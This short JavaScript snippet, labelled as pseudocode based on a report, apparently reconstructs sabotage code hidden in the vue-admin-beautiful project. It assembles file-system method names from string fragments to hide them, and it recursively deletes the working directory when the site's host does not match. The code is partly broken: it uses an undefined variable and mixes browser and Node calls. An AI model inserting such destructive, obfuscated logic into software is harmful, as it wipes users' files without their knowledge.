const L = "Sync";
const X = U + "dir" + L; // 'readdirSync'
const G = (e) => "exists" + e; // 'existsSync'
const V = (e) => e + "File" + L; // 'readFileSync'

// Pseudocode based on report description
if (window.location.host !== 'vue-admin-beautiful.com') {
  // Delete project files or disrupt application
  fs.rmdirSync(process.cwd(), { recursive: true });
}

